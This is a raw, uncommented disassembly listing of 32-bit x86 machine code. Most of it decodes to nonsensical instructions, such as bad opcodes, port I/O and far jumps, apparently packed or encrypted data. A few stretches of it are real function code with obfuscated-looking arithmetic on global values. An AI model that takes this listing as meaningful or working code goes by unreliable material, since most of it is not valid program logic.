  406992:	gs mov edi,0xbd5027ae
  406998:	jnp    0x406939
  40699a:	mov    ch,0x3b
  40699c:	dec    esi
  40699d:	and    ch,ah
  40699f:	into   
  4069a0:	lds    edi,FWORD PTR [esi+0x3]
  4069a3:	jle    0x4069d2
  4069a5:	sub    esp,edi
  4069a7:	or     dl,dh
  4069a9:	mov    eax,0x8c38c80c
  4069ae:	push   ss
  4069af:	mov    ecx,0xb3f8de65
  4069b5:	dec    ecx
  4069b6:	xor    dl,BYTE PTR [edi+esi*1]
  4069b9:	mov    dl,0xfc
  4069bb:	dec    edi
  4069bc:	fwait
  4069bd:	sahf   
  4069be:	iret   
  4069bf:	inc    ebx
  4069c0:	dec    esp
  4069c1:	or     eax,0x3557d950
  4069c6:	rol    BYTE PTR [ebx-0x17],0xf5
  4069ca:	rep outs dx,DWORD PTR ds:[esi]
  4069cc:	xor    eax,0xa3daf7a5
  4069d1:	out    0x36,eax
  4069d3:	adc    bl,bl
  4069d5:	imul   edi,ebp,0x5e
  4069d8:	pop    eax
  4069d9:	loope  0x406970
  4069db:	or     dh,BYTE PTR [ebx+0x43d687cc]
  4069e1:	into   
  4069e2:	jno    0x40699d
  4069e4:	jg     0x406a1c
  4069e6:	scas   al,BYTE PTR es:[edi]
  4069e7:	add    BYTE PTR [ebx+0x19],bl
  4069ea:	dec    esp
  4069ec:	(bad)  
  4069ed:	or     eax,0xb9346444
  4069f2:	and    edi,edx
  4069f4:	outs   dx,DWORD PTR ds:[esi]
  4069f5:	dec    esp
  4069f6:	test   BYTE PTR [ecx+0x3729c61e],cl
  4069fc:	pop    edi
  4069fd:	fwait
  4069fe:	and    DWORD PTR [ebp+0x73df0162],esp
  406a04:	inc    edi
  406a05:	push   0xffffff98
  406a07:	das    
  406a08:	fnsave [esi+esi*2+0x1f28fd71]
  406a0f:	fdiv   st(6),st
  406a11:	dec    ebx
  406a12:	dec    edi
  406a13:	in     al,dx
  406a14:	and    ecx,DWORD PTR [ebp-0x7a]
  406a17:	mov    ds:0xeaba633a,al
  406a1c:	call   0xa4db:0x5ad80958
  406a23:	or     cl,BYTE PTR ds:0x1662d8f4
  406a29:	mov    ebp,0x3590e17b
  406a2e:	arpl   dx,di
  406a30:	jno    0x406a45
  406a32:	idiv   DWORD PTR [ebp-0x70]
  406a35:	sub    ebx,DWORD PTR [ebx-0x1f5f8822]
  406a3b:	loop   0x4069f7
  406a3d:	jo     0x4069ec
  406a3f:	test   eax,0x98726d56
  406a44:	sub    eax,0x773eb117
  406a49:	jb     0x406a64
  406a4b:	lea    edi,[ebp+ebx*8-0x66]
  406a4f:	shl    DWORD PTR [esi],1
  406a51:	jl     0x406a02
  406a53:	not    BYTE PTR [ecx-0x1c70b937]
  406a59:	push   ds
  406a5a:	faddp  st(4),st
  406a5c:	das    
  406a5d:	bound  edx,QWORD PTR [ebx-0x9]
  406a60:	mov    ch,0x59
  406a62:	shl    DWORD PTR [esi-0x7c],cl
  406a65:	jno    0x406a4b
  406a67:	sub    DWORD PTR [ebx-0x6a],edx
  406a6a:	mov    bl,0xd9
  406a6c:	sub    bl,BYTE PTR [edi]
  406a6e:	aam    0xd6
  406a70:	pushf  
  406a71:	inc    edi
  406a72:	sbb    al,0xef
  406a74:	xor    ebp,DWORD PTR [esi]
  406a76:	(bad)  
  406a77:	push   ebp
  406a78:	lods   al,BYTE PTR ds:[esi]
  406a79:	dec    edx
  406a7a:	or     eax,DWORD PTR [ecx]
  406a7c:	cmp    eax,0xb7fa5ddc
  406a81:	in     eax,dx
  406a82:	nop
  406a83:	xor    ax,cx
  406a86:	mov    ecx,0x3b00
  406a8b:	add    ax,cx
  406a8e:	mov    ecx,DWORD PTR [ebp+0x8]
  406a91:	movzx  eax,ax
  406a94:	not    eax
  406a96:	and    eax,DWORD PTR [ecx]
  406a98:	mov    ecx,DWORD PTR [ebp+0x8]
  406a9b:	mov    DWORD PTR [ecx],eax
  406a9d:	jmp    0x406d02
  406aa2:	xor    DWORD PTR [ebp-0x4],0xe149ebe
  406aa9:	jmp    0x406d02
  406aae:	mov    edx,0x55acd5ce
  406ab3:	stos   DWORD PTR es:[edi],eax
  406ab4:	gs jmp 0x5c97:0xd9dda5c
  406abc:	hlt    
  406abd:	add    eax,0x7c7cc160
  406ac2:	xor    BYTE PTR [esi+0x7c],bh
  406ac5:	jl     0x406a53
  406ac7:	xchg   edx,eax
  406ac8:	mov    ebp,DWORD PTR [ebx+eiz*8+0x3e]
  406acc:	clc    
  406acd:	cmp    ecx,edx
  406acf:	jmp    0x6be98aa2
  406ad4:	std    
  406ad5:	leave  
  406ad6:	cmp    ecx,DWORD PTR [eax+0x1a]
  406ad9:	mov    ebp,0xd3d1c281
  406ade:	int    0x19
  406ae0:	jns    0x406b2b
  406ae2:	test   BYTE PTR [ebp+0x13b2d5c5],ah
  406ae8:	and    ch,dl
  406aea:	arpl   WORD PTR [eax],si
  406aec:	push   esi
  406aed:	dec    esi
  406aee:	push   eax
  406aef:	mov    esi,edx
  406af1:	mov    al,ds:0xad219202
  406af6:	xchg   edx,eax
  406af7:	dec    esi
  406af8:	fbld   TBYTE PTR [edx-0x5348314d]
  406afe:	loope  0x406add
  406b00:	inc    ebx
  406b01:	pop    eax
  406b02:	enter  0x56b5,0x91
  406b06:	ror    DWORD PTR [ecx],0x82
  406b09:	cmovg  esp,edx
  406b0c:	mov    bl,0xa3
  406b0e:	into   
  406b0f:	pop    eax
  406b10:	aas    
  406b11:	cs jno 0x406afc
  406b14:	in     al,dx
  406b15:	cdq    
  406b16:	mov    bl,0x92
  406b18:	lahf   
  406b19:	ret    
  406b1a:	pop    ss
  406b1b:	loope  0x406b7a
  406b1d:	les    ebx,FWORD PTR [edx-0x1c]
  406b20:	xchg   dh,ah
  406b22:	sub    BYTE PTR [ecx],0xef
  406b25:	cmp    ecx,DWORD PTR [ebp-0x1e]
  406b28:	(bad)  
  406b29:	sbb    DWORD PTR [esi],esi
  406b2b:	add    BYTE PTR [edx+ecx*4-0x5dbca68c],0xbf
  406b33:	jbe    0x406b3d
  406b35:	stos   DWORD PTR es:[edi],eax
  406b36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406b37:	pop    esi
  406b38:	pop    ebx
  406b39:	fs ror ebp,0xe2
  406b3d:	fdivr  DWORD PTR [edx]
  406b3f:	xchg   DWORD PTR [ecx-0x34e393f7],ebx
  406b45:	(bad)  
  406b46:	adc    esp,edi
  406b48:	jae    0x406b55
  406b4a:	xchg   ecx,eax
  406b4b:	and    DWORD PTR [edi+ebp*2+0xf0b514d],ecx
  406b52:	jle    0x406ada
  406b54:	push   ss
  406b55:	jbe    0x406bcb
  406b57:	imul   edi,ecx,0xc9a81131
  406b5d:	loop   0x406b0b
  406b5f:	retf   0x4795
  406b62:	dec    esi
  406b63:	(bad)  
  406b64:	(bad)  
  406b65:	add    bl,BYTE PTR [esi+0x707daaca]
  406b6b:	arpl   WORD PTR cs:[esi-0x70],dx
  406b6f:	or     DWORD PTR [ecx-0x22],edx
  406b72:	sub    esp,DWORD PTR [edx+edi*4-0x5897ce12]
  406b79:	xor    BYTE PTR [ebp+0x7f],ch
  406b7c:	out    dx,eax
  406b7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b7e:	rcl    DWORD PTR [esi-0xe],0x49
  406b82:	test   ch,ah
  406b84:	jmp    DWORD PTR [ebx+0x8]
  406b87:	pop    ds
  406b88:	mov    edi,0xfa7f204c
  406b8d:	mov    bl,BYTE PTR [ecx]
  406b8f:	lods   al,BYTE PTR ds:[esi]
  406b90:	dec    ecx
  406b91:	push   eax
  406b92:	fwait
  406b93:	mov    bh,0x50
  406b95:	in     al,dx
  406b96:	fs jno 0x406bed
  406b99:	jmp    0x406bdc
  406b9b:	ss inc ebp
  406b9d:	and    BYTE PTR [esp+edx*8+0x75],al
  406ba1:	loope  0x406bf8
  406ba3:	dec    edi
  406ba4:	mov    ah,0xc2
  406ba6:	mov    cl,0xb8
  406ba8:	stos   DWORD PTR es:[edi],eax
  406ba9:	retf   0xc4d1
  406bac:	int    0x8c
  406bae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406baf:	pop    ebp
  406bb0:	jne    0x406b7b
  406bb2:	js     0x406be4
  406bb4:	out    dx,eax
  406bb5:	xor    ebp,DWORD PTR [ebp+edi*4-0xf]
  406bb9:	jae    0x406c0c
  406bbb:	pop    es
  406bbc:	sbb    eax,0xbdf64377
  406bc1:	fldcw  WORD PTR [edi+eiz*4]
  406bc4:	cmp    ah,BYTE PTR [esi-0xddbf532]
  406bca:	push   0x6578f276
  406bcf:	inc    esi
  406bd0:	jnp    0x406b6d
  406bd2:	sbb    al,0xc0
  406bd4:	mov    ds:0x1c37d78c,eax
  406bd9:	pop    ds
  406bda:	lock cmp dl,BYTE PTR ds:[eax+0x5d]
  406bdf:	loopne 0x406ba4
  406be1:	test   BYTE PTR [edi+edx*1+0x28],ah
  406be5:	push   edx
  406be6:	or     dh,ch
  406be8:	inc    ebx
  406be9:	loopne 0x406c5a
  406beb:	jl     0x406bb2
  406bed:	mov    eax,0x1590dbae
  406bf2:	stos   DWORD PTR es:[edi],eax
  406bf3:	pop    esi
  406bf4:	fild   WORD PTR [esi+0xa]
  406bf7:	cmc    
  406bf8:	mov    ebx,?
  406bfa:	fld    TBYTE PTR [ebp+ebp*4+0x16]
  406bfe:	mov    eax,esp
  406c00:	jle    0x406bdb
  406c02:	adc    bh,BYTE PTR [edi+0x1d]
  406c05:	pushf  
  406c06:	fisub  DWORD PTR [edx]
  406c08:	xchg   DWORD PTR [eax+0x3a7b5501],edx
  406c0e:	fisub  DWORD PTR [ebp+0x71]
  406c11:	and    dh,bh
  406c13:	fsubr  QWORD PTR [ecx+eiz*1-0x28ba8c9]
  406c1a:	mov    esi,0x4ab6718a
  406c1f:	inc    edi
  406c20:	cmp    ecx,edx
  406c22:	outs   dx,BYTE PTR ds:[esi]
  406c23:	jecxz  0x406c9f
  406c25:	shl    DWORD PTR [ebx-0x6b],0x3d
  406c29:	adc    DWORD PTR [edi+0x67a4fa43],ebp
  406c2f:	mov    ecx,0xd3c52df0
  406c34:	mov    ebp,0x81fecea1
  406c39:	loope  0x406c28
  406c3b:	in     eax,0x8
  406c3d:	retf   0x83a6
  406c40:	dec    edx
  406c41:	popf   
  406c42:	mov    bl,BYTE PTR [ebx]
  406c44:	in     eax,0xfe
  406c46:	sti    
  406c47:	test   al,0x92
  406c49:	dec    ecx
  406c4a:	mov    dl,0xd5
  406c4c:	inc    ebx
  406c4d:	cmp    al,0xc7
  406c4f:	ret    
  406c50:	int    0x18
  406c52:	add    DWORD PTR [edi+0x74],edi
  406c55:	push   ebx
  406c56:	pop    ebp
  406c57:	stc    
  406c58:	pop    esp
  406c59:	ja     0x406c2e
  406c5b:	call   0xf670:0xc27741c7
  406c62:	icebp  
  406c63:	stc    
  406c64:	cld    
  406c65:	sahf   
  406c66:	sub    al,0xa7
  406c68:	nop
  406c69:	mov    al,ds:0x1e288e7f
  406c6e:	sahf   
  406c6f:	push   edx
  406c70:	xchg   ebx,ebx
  406c72:	popa   
  406c73:	std    
  406c74:	mov    esi,DWORD PTR [eax+esi*8-0x5b]
  406c78:	out    0xec,al
  406c7a:	(bad)  
  406c7b:	fsub   st,st(7)
  406c7d:	mov    al,ds:0x2aab9a5b
  406c82:	and    BYTE PTR fs:[ebx+0x68b82f7d],bl
  406c89:	iret   
  406c8a:	sub    edx,DWORD PTR [ecx]
  406c8c:	dec    edx
  406c8d:	out    0x87,al
  406c8f:	stos   DWORD PTR es:[edi],eax
  406c90:	aad    0x61
  406c92:	jo     0x406d0b
  406c94:	sar    BYTE PTR ds:0x7390641,0x1e
  406c9b:	sbb    al,BYTE PTR [ebx+0x43]
  406c9e:	daa    
  406c9f:	repnz dec ebp
  406ca1:	nop
  406ca2:	sbb    al,0xfd
  406ca4:	stos   DWORD PTR es:[edi],eax
  406ca5:	out    0xe5,eax
  406ca7:	aad    0x71
  406ca9:	xchg   edx,eax
  406caa:	mov    bl,0xa3
  406cac:	pop    esp
  406cad:	inc    esp
  406cae:	leave  
  406caf:	ret    
  406cb0:	or     BYTE PTR [esi-0x69],ah
  406cb3:	ret    0x1469
  406cb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406cb7:	scas   eax,DWORD PTR es:[edi]
  406cb8:	mov    esi,0xbafb8359
  406cbd:	dec    esp
  406cbe:	cmp    al,0x23
  406cc0:	mov    bh,0x48
  406cc2:	fidivr WORD PTR [esi-0x77]
  406cc5:	mov    dh,0xf
  406cc7:	bound  esp,QWORD PTR ds:0x4ee1cde
  406ccd:	loopne 0x406cc5
  406ccf:	jns    0x406c89
  406cd1:	outs   dx,DWORD PTR ds:[esi]
  406cd2:	jge    0x406cd6
  406cd4:	add    BYTE PTR [edi+0x61c22c5f],bh
  406cda:	push   0xffffff8a
  406cdc:	inc    eax
  406cdd:	mov    ch,0x21
  406cdf:	hlt    
  406ce0:	mov    ds:0x1875219b,eax
  406ce5:	xor    al,ch
  406ce7:	mov    eax,ds:0xa02da9fa
  406cec:	inc    esp
  406ced:	xor    eax,0xe6436287
  406cf2:	jmp    0x7d9c:0xe92bc260
  406cf9:	or     DWORD PTR [ecx+0x4a1e16ec],0x66810fb8
  406d03:	mov    eax,DWORD PTR [ebp-0x8]
  406d06:	push   DWORD PTR [ebp+0x8]
  406d09:	call   0x406d1a
  406d0e:	test   eax,eax
  406d10:	je     0x406aa2
  406d16:	leave  
  406d17:	ret    0x4
  406d1a:	push   ebp
  406d1b:	mov    ebp,esp
  406d1d:	sub    esp,0x2c
  406d20:	mov    ecx,DWORD PTR ds:0x43377f
  406d26:	mov    ecx,DWORD PTR [ecx]
  406d28:	or     DWORD PTR ds:0x43379b,ecx
  406d2e:	mov    DWORD PTR [ebp-0x8],0xf89c8534
  406d35:	mov    DWORD PTR [ebp-0x14],0xf89c8535
  406d3c:	xor    DWORD PTR ds:0x43371b,0x9dc
  406d46:	mov    eax,0x9577
  406d4b:	movzx  ecx,BYTE PTR ds:0x4336c3
  406d52:	or     DWORD PTR ds:0x43371f,ecx
  406d58:	mov    WORD PTR [ebp-0x4],ax
  406d5c:	and    DWORD PTR ds:0x4336d7,0xaa
  406d66:	lea    eax,[ebp-0x24]
  406d69:	adc    DWORD PTR ds:0x43379b,ebx
  406d6f:	jmp    0x4070e5
  406d74:	mov    esp,ecx
  406d76:	in     eax,dx
  406d77:	xchg   ebx,eax
  406d78:	ins    DWORD PTR es:[edi],dx
  406d79:	mov    ebp,0xc300d269
  406d7e:	mov    al,BYTE PTR ss:[edx+0x243943af]
  406d85:	ret    0x7c7c
  406d88:	xlat   BYTE PTR ds:[ebx]
  406d89:	jns    0x406e07
  406d8b:	jl     0x406d84
  406d8d:	mov    bl,0xd8
  406d8f:	in     al,0xfc
  406d91:	add    BYTE PTR [ecx+0x3fee80bf],cl
  406d97:	shl    DWORD PTR [ebx+0x76],1
  406d9a:	fldcw  WORD PTR [edx+0x35]
  406d9d:	mov    bl,0xd6
  406d9f:	inc    edx
  406da0:	mov    ch,0x88
  406da2:	add    dh,BYTE PTR [ecx+0x14]
  406da5:	and    eax,0x9630584a
  406daa:	and    dh,BYTE PTR [esi-0x4e]
  406dad:	xchg   DWORD PTR [ebx-0x5173a21b],ecx
  406db3:	xchg   edx,eax
  406db4:	sub    esi,ecx
  406db6:	cdq    
  406db7:	mov    ah,0x7e
  406db9:	xor    BYTE PTR [edx+0x24],cl
  406dbc:	outs   dx,BYTE PTR ds:[esi]
  406dbd:	mov    ecx,0x6a493cd5
  406dc2:	xor    BYTE PTR [ebx],0xf2
  406dc5:	faddp  st(1),st
  406dc7:	inc    edx
  406dc8:	push   esi
  406dc9:	out    0x6b,eax
  406dcb:	xchg   DWORD PTR [bx-0x594e],esp
  406dd0:	cmp    esp,edx
  406dd2:	call   FWORD PTR [eax]
  406dd4:	cmc    
  406dd5:	dec    esi
  406dd6:	push   es
  406dd7:	cld    
  406dd8:	fidivr WORD PTR [esi-0x75]
  406ddb:	leave  
  406ddc:	rol    DWORD PTR [ebp+ecx*8-0x7e],1
  406de0:	aad    0x50
  406de2:	aam    0xb
  406de4:	mov    edi,0x2f6c6b01
  406de9:	nop
  406dea:	mul    BYTE PTR [eax]
  406dec:	cdq    
  406ded:	in     eax,dx
  406dee:	or     al,0xe7
  406df0:	aaa    
  406df1:	sbb    DWORD PTR [esi+0x4ab95d34],eax
  406df7:	pop    ecx
  406df8:	cwde   
  406df9:	and    al,0x34
  406dfb:	mov    esi,0xc7f9586e
  406e00:	jnp    0x406e47
  406e02:	into   
  406e03:	repz cmc 
  406e05:	daa    
  406e06:	pusha  
  406e07:	out    0xaa,eax
  406e09:	inc    ebp
  406e0a:	xchg   edi,eax
  406e0b:	add    al,0x70
  406e0d:	jle    0x406df6
  406e0f:	ds pop esi
  406e11:	(bad)  
  406e12:	int    0x34
  406e14:	pop    edx
  406e15:	xchg   esi,edx
  406e17:	pop    esp
  406e18:	inc    esi
  406e19:	repnz (bad) 
  406e1b:	out    dx,eax
  406e1c:	jmp    0x320b6f1a
  406e21:	(bad)  
  406e23:	mov    esi,0x94609ff5
  406e28:	push   esi
  406e29:	sub    DWORD PTR [edi-0x32],0xe624a060
  406e30:	adc    al,0x7d
  406e32:	sahf   
  406e33:	xchg   edi,eax
  406e34:	pop    es
  406e35:	dec    esp
  406e36:	neg    DWORD PTR ds:0xc614b25e
  406e3c:	xchg   ebx,eax
  406e3d:	mov    ecx,0x77a4c1b1
  406e42:	push   eax
  406e43:	scas   eax,DWORD PTR es:[edi]
  406e44:	das    
  406e45:	(bad)  
  406e46:	pop    ds
  406e47:	jp     0x406e5a
  406e49:	or     edi,edx
  406e4b:	leave  
  406e4c:	rcr    dh,cl
  406e4e:	cld    
  406e4f:	jge    0x406dd7
  406e51:	push   edi
  406e52:	push   ss
  406e53:	fs mov al,0x6a
  406e56:	jge    0x406e4f
  406e58:	pop    ecx
  406e59:	push   0x43
  406e5b:	(bad)  
  406e5c:	fcmovnu st,st(5)
  406e5e:	jae    0x406ea3
  406e60:	fidivr WORD PTR [ebx]
  406e62:	(bad)  
  406e63:	fisttp DWORD PTR [ebx+0x4726f04]
  406e69:	inc    esi
  406e6a:	pop    ss
  406e6b:	sahf   
  406e6c:	pop    esp
  406e6d:	dec    edx
  406e6e:	retf   0x460f
  406e71:	xchg   esp,eax
  406e72:	mov    dh,BYTE PTR [esi]
  406e74:	test   eax,0x25333a0d
  406e79:	fadd   DWORD PTR [edx+0x39]
  406e7c:	loope  0x406e84
  406e7e:	pop    ss
  406e7f:	test   BYTE PTR [edi],dh
  406e81:	sbb    eax,0xfae667ef
  406e86:	in     al,0xa4
  406e88:	adc    bh,BYTE PTR ds:0xd07e8d5c
  406e8e:	es popa 
  406e90:	imul   esi,DWORD PTR [ebp-0x5a7fd223],0xffffffe3
  406e97:	jmp    0x406f0d
  406e99:	push   ebp
  406e9a:	cmp    bh,BYTE PTR [edi]
  406e9c:	fstp   DWORD PTR [edx+0x2f]
  406e9f:	fldenv [ebx-0x5896ab5b]
  406ea5:	shl    DWORD PTR [eax+edx*1+0x23],1
  406ea9:	sbb    al,0x22
  406eab:	lahf   
  406eac:	shr    dl,1
  406eae:	in     al,0xca
  406eb0:	(bad)  
  406eb1:	iret   
  406eb2:	sbb    al,bh
  406eb4:	mov    eax,ds:0x6320159
  406eb9:	mov    es,WORD PTR [edx+edi*4-0x6cd2ba03]
  406ec0:	cld    
  406ec1:	and    al,0x6f
  406ec3:	mov    esi,es
  406ec5:	icebp  
  406ec6:	xchg   edx,eax
  406ec7:	adc    al,0x7b
  406ec9:	sar    BYTE PTR [edx+esi*2+0x5cae4e9f],1
  406ed0:	inc    ecx
  406ed1:	adc    al,0x45
  406ed3:	sbb    BYTE PTR [ebp+0x16],dl
  406ed6:	adc    bl,dh
  406ed8:	push   cs
  406ed9:	outs   dx,BYTE PTR ds:[esi]
  406eda:	cmc    
  406edb:	push   edx
  406edc:	psrlw  mm3,QWORD PTR [edx-0x40]
  406ee0:	test   DWORD PTR [eax+ecx*4-0x76],edx
  406ee4:	and    esp,edx
  406ee6:	jmp    0x406ed0
  406ee8:	push   ecx
  406ee9:	shr    esp,1
  406eeb:	dec    esp
  406eec:	cdq    
  406eed:	adc    BYTE PTR [eax+0x25],0x52
  406ef1:	sub    ah,dh
  406ef3:	push   ecx
  406ef4:	imul   DWORD PTR [edx-0xc]
  406ef7:	mov    esp,0x841e7903
  406efc:	bound  esi,QWORD PTR [edi-0x36]
  406eff:	daa    
  406f00:	iret   
  406f01:	arpl   sp,bx
  406f03:	jg     0x406f3e
  406f05:	imul   ebx,edx,0x4c
  406f08:	pop    ecx
  406f09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f0a:	sbb    esp,DWORD PTR [ebx]
  406f0c:	inc    ebp
  406f0d:	fst    DWORD PTR [edx+0x77]
  406f10:	adc    al,0xdc
  406f12:	pop    ecx
  406f13:	or     BYTE PTR [edx],cl
  406f15:	mov    ds:0x9fd772a9,al
  406f1a:	scas   eax,DWORD PTR es:[edi]
  406f1b:	mov    edx,cs
  406f1d:	sbb    BYTE PTR [edi+eax*2],dl
  406f20:	into   
  406f21:	sbb    bl,BYTE PTR [esi+0x3d]
  406f24:	(bad)  
  406f25:	clc    
  406f26:	loope  0x406fa3
  406f28:	mov    ?,WORD PTR [esi-0x76a877f2]
  406f2e:	push   es
  406f2f:	sti    
  406f30:	ret    
  406f31:	push   ebp
  406f32:	mov    bh,0x34
  406f34:	aas    
  406f35:	and    eax,0x2f67a2b6
  406f3b:	xor    eax,DWORD PTR [ebx+eax*1-0x8]
  406f3f:	nop
  406f40:	sti    
  406f41:	stos   BYTE PTR es:[edi],al
  406f42:	in     eax,0xd5
  406f44:	jg     0x406f9e
  406f46:	push   ss
  406f47:	mov    bl,0xd3
  406f49:	fwait
  406f4a:	xchg   esp,eax
  406f4b:	mov    ebx,0xcbc8ea71
  406f50:	popf   
  406f51:	mov    esp,0x7af129a6
  406f56:	ficom  DWORD PTR [ebx-0x1f180d1d]
  406f5c:	shl    DWORD PTR [edx+0x43a7a178],1
  406f62:	push   esi
  406f63:	adc    al,0x7c
  406f65:	lock jmp 0x406f09
  406f68:	mov    bh,0x23
  406f6a:	scas   eax,DWORD PTR es:[edi]
  406f6b:	(bad)  
  406f6c:	scas   al,BYTE PTR es:[edi]
  406f6d:	test   al,0xf0
  406f6f:	pushf  
  406f70:	sahf   
  406f71:	repnz mov edx,DWORD PTR [ebx+0x5b]
  406f75:	inc    ebx
  406f76:	fldcw  WORD PTR [edx-0xaeeadea]
  406f7c:	jb     0x406fe8
  406f7e:	(bad)  
  406f7f:	mov    ah,0xd
  406f81:	in     eax,0xd7
  406f83:	pop    edx
  406f84:	retf   
  406f85:	out    0x7b,al
  406f87:	mov    ecx,tr4
  406f8a:	mov    gs,ecx
  406f8c:	inc    ecx
  406f8d:	mov    dh,0x2c
  406f8f:	pop    esi
  406f90:	and    esi,DWORD PTR [edi+esi*4-0xd]
  406f94:	or     DWORD PTR [ecx],edi
  406f96:	sbb    DWORD PTR [eax+0xe6babf0],0xffffffd2
  406f9d:	xchg   edx,eax
  406f9e:	xor    bh,BYTE PTR [esi+0x4f2a7fe2]
  406fa4:	mov    bh,BYTE PTR [edi]
  406fa6:	outs   dx,BYTE PTR ds:[esi]
  406fa7:	ret    0x3ebf
  406faa:	adc    al,0xd1
  406fac:	ss dec esi
  406fae:	retf   
  406faf:	push   ds
  406fb0:	lock outs dx,BYTE PTR ds:[esi]
  406fb2:	lahf   
  406fb3:	or     ebp,ebx
  406fb5:	sub    DWORD PTR [edx-0x19],esp
  406fb8:	stc    
  406fb9:	cmp    al,0x64
  406fbb:	dec    edx
  406fbc:	cmp    BYTE PTR [ebp+0x35935840],ch
  406fc2:	or     al,0xbf
  406fc4:	jnp    0x406fbc
  406fc6:	iret   
  406fc7:	or     eax,ebp
  406fc9:	in     al,0x29
  406fcb:	adc    DWORD PTR [esi+0x1089f55],esp
  406fd1:	mov    dh,BYTE PTR [ecx+0x13dd74af]
  406fd7:	cs dec edi
  406fd9:	jmp    0xdf8409e3
  406fde:	sbb    eax,0xb63458a1
  406fe3:	xchg   esi,eax
  406fe4:	pop    eax
  406fe5:	or     BYTE PTR ds:[edi-0x57],0x3a
  406fea:	inc    ebp
  406feb:	ja     0x406fc1
  406fed:	mov    dl,0x3a
  406fef:	dec    edx
  406ff0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ff1:	cmp    bh,al
  406ff3:	xchg   esp,eax
  406ff4:	imul   ebp,esp,0xb28d46fb
  406ffa:	adc    eax,0x9fa84626
  406fff:	imul   edi,DWORD PTR [ebp-0xa],0x6ac8d332
  407006:	je     0x407082
  407008:	pop    eax
  407009:	push   edx
  40700a:	les    esi,FWORD PTR [ecx-0x64d5344b]
  407010:	cwde   
  407011:	sbb    al,0x2f
  407013:	cmp    edx,DWORD PTR [ecx]
  407015:	dec    esp
  407016:	sahf   
  407017:	mov    edi,0x3196aea9
  40701c:	stos   DWORD PTR es:[edi],eax
  40701d:	push   0xffffffbe
  40701f:	pop    ebx
  407020:	outs   dx,DWORD PTR ds:[esi]
  407021:	xchg   ecx,eax
  407022:	xchg   ebp,eax
  407023:	sub    al,0x53
  407025:	mov    ds,WORD PTR [eax+edi*8-0x4e]
  407029:	push   0x651ace67
  40702e:	(bad)
  407031:	mov    ds:0x6110c872,al
  407036:	fldenv [ecx]
  407038:	pop    ds
  407039:	push   ecx
  40703a:	push   es
  40703b:	mov    dh,0x6c
  40703d:	fwait
  40703e:	pushf  
  40703f:	in     eax,0x78
  407041:	loope  0x407094
  407043:	not    DWORD PTR [ebx+0x0]
  407046:	mov    ds:0x1f814b27,eax
  40704b:	and    BYTE PTR [edx+0x7b],cl
  40704e:	xor    bl,cl
  407050:	cs cmp eax,0xc355299c
  407056:	pop    ds
  407057:	stos   DWORD PTR es:[edi],eax
  407058:	xor    al,0xd2
  40705a:	retf   
  40705b:	adc    DWORD PTR [edi],ebx
  40705d:	cmp    DWORD PTR gs:[eax+0x4],edx
  407061:	jge    0x4070a9
  407063:	jp     0x4070c7
  407065:	repz mov esp,0xacc05fcc
  40706b:	shl    BYTE PTR [eax],1
  40706d:	and    DWORD PTR [bp+si],0x6bfa26a5
  407074:	push   ds
  407075:	cmp    DWORD PTR [edi+0x5d9204ec],edx
  40707b:	xor    eax,0xef0078d5
  407080:	push   ebx
  407081:	or     esp,DWORD PTR [ecx]
  407083:	ins    DWORD PTR es:[edi],dx
  407084:	sub    esi,DWORD PTR [edx]
  407086:	and    al,BYTE PTR [ebp-0xdaa65db]
  40708c:	sahf   
  40708d:	xor    esi,esp
  40708f:	jo     0x407102
  407091:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407092:	cld    
  407093:	mov    dh,0x64
  407095:	cmovbe eax,DWORD PTR [ebp+0x39]
  407099:	sub    al,0xae
  40709b:	sbb    eax,DWORD PTR [ebp+0x4d5b054f]
  4070a1:	dec    esi
  4070a2:	lea    edx,[ebx+0x3175aa9c]
  4070a8:	cmp    eax,0xfb57d98e
  4070ad:	xor    DWORD PTR [eax-0x3e],eax
  4070b0:	ror    DWORD PTR [esi],0x59
  4070b3:	hlt    
  4070b4:	pop    ecx
  4070b5:	jl     0x407122
  4070b7:	jmp    0x40705d
  4070b9:	sbb    DWORD PTR [edx],edx
  4070bb:	outs   dx,BYTE PTR ds:[esi]
  4070bc:	icebp  
  4070bd:	stos   DWORD PTR es:[edi],eax
  4070be:	enter  0x3be5,0x61
  4070c2:	mov    dh,0x3d
  4070c4:	cmp    eax,0x3be00cc8
  4070c9:	ret    
  4070ca:	or     ah,0x4e
  4070cd:	adc    al,0x34
  4070cf:	or     al,0xdd
  4070d1:	idiv   dl
  4070d3:	dec    ebx
  4070d4:	daa    
  4070d5:	xor    ch,BYTE PTR [ebp+0x3698fa38]
  4070db:	xchg   esi,eax
  4070dc:	jnp    0xf98e27d7
  4070e2:	adc    eax,0x4589e44a
  4070e7:	fadd   DWORD PTR [ecx+0x4336cf25]
  4070ed:	add    BYTE PTR [ebp+0x27],cl
  4070f0:	add    BYTE PTR [eax],al
  4070f2:	mov    eax,DWORD PTR [ebp+0x8]
  4070f5:	mov    DWORD PTR [ebp-0x20],eax
  4070f8:	xor    ecx,ecx
  4070fa:	xor    ecx,DWORD PTR ds:0x433773
  407100:	add    ecx,DWORD PTR ds:0x4336c3
  407106:	mov    DWORD PTR ds:0x433773,ecx
  40710c:	jmp    0x407482
  407111:	ret    
  407112:	and    dl,dl
  407114:	paddw  mm5,mm1
  407117:	int    0xf0
  407119:	xchg   DWORD PTR [esi+0xb],edx
  40711c:	jmp    DWORD PTR [ecx]
  40711e:	inc    eax
  40711f:	scas   al,BYTE PTR es:[edi]
  407120:	sub    edi,edi
  407122:	iret   
  407123:	jl     0x4071a1
  407125:	xlat   BYTE PTR ds:[ebx]
  407126:	jns    0x4071a4
  407128:	jl     0x407166
  40712a:	push   ss
  40712b:	out    dx,al
  40712c:	scas   al,BYTE PTR es:[edi]
  40712d:	xor    eax,0x946b75f5
  407132:	leave  
  407133:	mov    cl,bl
  407135:	call   0xc1ce1098
  40713a:	inc    eax
  40713b:	lea    edi,[ebp+0x17008b33]
  407141:	pop    ds
  407142:	add    ah,cl
  407144:	pop    ss
  407145:	jae    0x4071c3
  407147:	mov    ebx,0x7ee80564
  40714c:	xchg   ebp,eax
  40714d:	pop    esi
  40714e:	adc    eax,0x99a9ed9
  407153:	or     BYTE PTR [ebx+0x24a0828c],0xff
  40715a:	stos   BYTE PTR es:[edi],al
